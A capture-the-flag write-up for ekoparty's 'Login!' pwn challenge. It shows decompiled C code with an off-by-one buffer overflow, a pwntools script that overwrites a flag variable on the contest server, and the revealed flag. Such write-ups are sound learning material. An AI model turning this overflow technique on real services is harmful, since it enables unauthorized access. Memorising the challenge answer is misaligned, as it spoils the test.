## ekoparty_pre-ctf: pwn50

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| ekoparty_pre-ctf | Login! | Pwn | 50  |



*Description*
> Are you admin?

> nc challs.ctf.site 20000

> Attachment: pwn50.zip 

----------
## Write-up

In IDA we see the following pseudocode:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed __int64 v3; // rcx@2
  int *v4; // rdi@2
  int result; // eax@11
  __int64 v6; // rbx@11
  FILE *stream; // [sp+18h] [bp-D8h]@1
  int bytes_user_read; // [sp+20h] [bp-D0h]@2
  int username; // [sp+24h] [bp-CCh]@5
  int bytes_password_read; // [sp+34h] [bp-BCh]@5
  __int64 password; // [sp+38h] [bp-B8h]@5
  int showflag; // [sp+48h] [bp-A8h]@5
  char s; // [sp+50h] [bp-A0h]@2
  __int64 v14; // [sp+D8h] [bp-18h]@1

  v14 = *MK_FP(__FS__, 40LL);
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    fgets(&s, 32, stream);
    fclose(stream);
    v3 = 5LL;
    v4 = &bytes_user_read;
    while ( v3 )
    {
      *v4 = 0LL;
      v4 += 2;
      --v3;
    }
    *v4 = 0;
    bytes_user_read = 17;
    bytes_password_read = 16;
    showflag = 0;
    printf("User : ", 32LL, v4 + 1, argv);
    fflush(0LL);
    read(0, &username, bytes_user_read);
    printf("Password : ", &username);
    fflush(0LL);
    read(0, &password, bytes_password_read);
    if ( !strncmp(&username, "charly", 6uLL) && !strncmp(&password, "h4ckTH1s", 8uLL) )
    {
      puts("Welcome guest!");
      if ( showflag == 1 )
        printf("Your flag is : %s\n", &s);
    }
  }
  else
  {
    puts("Error leyendo datos");
  }
  result = 0;
  v6 = *MK_FP(__FS__, 40LL) ^ v14;
  return result;
}
```

From which we deduce the following application logic:

* read in 17 bytes of username in a 16 byte buffer, which can overflow the number of bytes that are read for the password.
* read in the password
* compare the first 6 bytes of username to "charly" and the first 8 bytes of password to "h4ckTH1s"
* show the flag if flag == 1

We can exploit this by overflowing the password read with a value high enough to change the flag variable to 1:

```python
#!/usr/bin/python

from pwn import *

host = "challs.ctf.site"
port = 20000

s = remote(host, port)

print s.recvuntil("User :")
s.send("charlyaaaaaaaaaaa")
print s.recvuntil("Password :")
s.send("h4ckTH1s" + "\x00"*8+"\x01")
print s.recvline()
print s.recvline()
```

Which gives:

```
./login.py 
[+] Opening connection to challs.ctf.site on port 20000: Done
User :
 Password :
 Welcome guest!

Your flag is : EKO{Back_to_r00000ooooo00000tS}

[*] Closed connection to challs.ctf.site port 20000
```

The flag is:

```
EKO{Back_to_r00000ooooo00000tS}
```
